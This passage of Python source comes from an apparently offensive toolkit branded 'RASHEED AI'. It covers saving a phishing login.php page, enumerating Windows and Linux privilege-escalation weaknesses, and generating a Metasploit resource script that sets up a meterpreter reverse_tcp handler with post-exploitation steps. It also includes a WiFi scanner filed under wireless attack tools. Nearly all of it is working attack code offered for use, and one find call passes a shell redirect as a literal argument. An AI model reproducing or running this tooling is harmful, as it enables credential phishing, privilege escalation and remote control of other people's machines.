    (phishing_dir / "login.php").write_text(php)
    result["saved_to"] = str(phishing_dir)

    return result

# ═══════════════════════════════════════════════════════════════════
# 12. PRIVILEGE ESCALATION
# ═══════════════════════════════════════════════════════════════════


def check_privesc_windows() -> Dict:
    """Check Windows privilege escalation vectors"""
    results = {"checks": {}, "vulnerabilities": []}

    if not IS_WINDOWS:
        return {"error": "Windows only"}

    # Check OS version
    results["os"] = platform.platform()

    # Check if running as admin
    try:
        import ctypes
        results["is_admin"] = ctypes.windll.shell32.IsUserAnAdmin() != 0
    except: results["is_admin"] = False

    # Check for common misconfigurations
    try:
        # AlwaysInstallElevated
        r = execute_command('reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul')
        if "0x1" in r: results["vulnerabilities"].append("AlwaysInstallElevated enabled (HKLM)")

        r = execute_command('reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul')
        if "0x1" in r: results["vulnerabilities"].append("AlwaysInstallElevated enabled (HKCU)")

        # Unquoted service paths
        r = execute_command('wmic service get name,displayname,pathname,startmode 2>nul | findstr /i "Auto"')
        for line in r.split('\n'):
            if ' ' in line and '"' not in line:
                path = ' '.join(line.split()[1:])
                if ' ' in path and path.startswith('C:'):
                    check_path = path.split('.exe')[0] + '.exe'
                    if ' ' in check_path:
                        results["vulnerabilities"].append(f"Unquoted service path: {line.strip()}")

    except: pass

    # Check for weak permissions on common directories
    try:
        dirs_to_check = [
            "C:\\ProgramData", "C:\\Windows\\Temp", "C:\\Users\\Public",
            os.path.expanduser("~\\AppData\\Local\\Temp")
        ]
        for d in dirs_to_check:
            if os.path.exists(d):
                try:
                    test_file = os.path.join(d, "rasheed_test_write.tmp")
                    with open(test_file, 'w') as f: f.write("test")
                    os.remove(test_file)
                    results["vulnerabilities"].append(f"Writable directory: {d}")
                except: pass
    except: pass

    results["vulnerability_count"] = len(results["vulnerabilities"])
    return results


def check_privesc_linux() -> Dict:
    """Check Linux privilege escalation vectors"""
    results = {"checks": {}, "vulnerabilities": []}

    # Check sudo privileges
    try:
        r = subprocess.run(["sudo", "-l"], capture_output=True, text=True, timeout=10)
        results["sudo_access"] = r.stdout
        if '(root)' in r.stdout:
            results["vulnerabilities"].append("User has sudo access")
    except: pass

    # Check SUID binaries
    try:
        r = subprocess.run(["find", "/", "-perm", "-4000", "-type", "f", "2>/dev/null"],
                          capture_output=True, text=True, timeout=15)
        suid = [l.strip() for l in r.stdout.split('\n') if l.strip()]
        results["suid_binaries"] = suid[:20]
    except: pass

    # Check kernel version
    try:
        r = subprocess.run(["uname", "-a"], capture_output=True, text=True, timeout=5)
        results["kernel"] = r.stdout.strip()
    except: pass

    # Check writable /etc/passwd
    try:
        if os.access("/etc/passwd", os.W_OK):
            results["vulnerabilities"].append("/etc/passwd is writable!")
    except: pass

    results["vulnerability_count"] = len(results["vulnerabilities"])
    return results

# ═══════════════════════════════════════════════════════════════════
# 13. GENERATE METASPLOIT RESOURCE SCRIPT
# ═══════════════════════════════════════════════════════════════════


def generate_msf_resource(lhost: str="127.0.0.1", lport: int=4444,
                          target: str="", exploit: str="") -> str:
    """Generate Metasploit resource (.rc) script"""
    rc = f"""# Metasploit Resource Script - Generated by RASHEED AI
# Target: {target or 'Not specified'}
# Payload: windows/meterpreter/reverse_tcp -> {lhost}:{lport}

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
set SessionCommunicationTimeout 0
set AutoRunScript post/windows/manage/migrate

"""
    if exploit:
        rc += f"""# Specific exploit
use {exploit}
set RHOSTS {target}
set LHOST {lhost}
set LPORT {lport}
exploit -j -z

"""
    rc += """# Post-exploitation
run -j
sessions -l
"""

    fname = PAYLOADS_DIR / f"msf_resource_{lport}.rc"
    fname.write_text(rc)
    return str(fname)

# ═══════════════════════════════════════════════════════════════════
# 14. WIRELESS ATTACK TOOLS
# ═══════════════════════════════════════════════════════════════════


def scan_wifi() -> Dict:
    """Scan for WiFi networks (requires admin)"""
    results = {"networks": [], "error": ""}

    if IS_WINDOWS:
        try:
            r = subprocess.run(["netsh", "wlan", "show", "networks", "mode=Bssid"],
                             capture_output=True, text=True,
                             creationflags=subprocess.CREATE_NO_WINDOW)
            current_ssid = ""
            for line in r.stdout.split('\n'):
                line = line.strip()
                if "SSID" in line and "BSSID" not in line:
                    current_ssid = line.split(':')[1].strip()
                    results["networks"].append({"ssid": current_ssid, "bssids": []})
                elif "BSSID" in line and current_ssid:
                    bssid = line.split(':')[1].strip()
                    if results["networks"]:
                        results["networks"][-1]["bssids"].append({"bssid": bssid})
                elif "Signal" in line and results["networks"]:
                    signal = line.split(':')[1].strip().replace('%', '')
                    if results["networks"][-1]["bssids"]:
                        results["networks"][-1]["bssids"][-1]["signal"] = signal
            return results
        except Exception as e:
            results["error"] = str(e)
    else:
        try:
            # Linux - use nmcli or iwlist
            r = subprocess.run(["nmcli", "-t", "-f", "SSID,SIGNAL,SECURITY", "dev", "wifi"],
                             capture_output=True, text=True, timeout=15)
            for line in r.stdout.split('\n'):
                if ':' in line:
                    parts = line.split(':')
                    if len(parts) >= 2:
                        results["networks"].append({
                            "ssid": parts[0],
                            "signal": parts[1] if len(parts) > 1 else "?",
                            "security": parts[2] if len(parts) > 2 else "?"
                        })
        except: pass

    return results
